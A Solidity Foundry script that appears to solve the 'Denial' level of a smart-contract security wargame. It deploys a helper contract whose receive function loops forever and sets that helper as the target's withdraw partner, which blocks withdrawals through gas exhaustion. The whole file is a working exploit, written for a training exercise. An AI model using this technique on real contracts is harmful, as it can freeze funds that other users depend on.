// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/console.sol";
import "forge-std/Script.sol";
import "../src/20_Denial.sol";

contract Helper {
    constructor() { }

    receive() external payable { 
        while (true) {}
    }
}

contract POC is Script {
    Denial public target;
    Helper public helper;

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        target = Denial(payable(0x1cE0E985C1F734F76f5E1a329a90Fb2Fcd9beCb4));
        helper = new Helper();

        address partner = target.partner();
        console.log("before partner: ", partner);

        target.setWithdrawPartner(address(helper));

        partner = target.partner();
        console.log("after  partner: ", partner);

        vm.stopBroadcast();
    }
}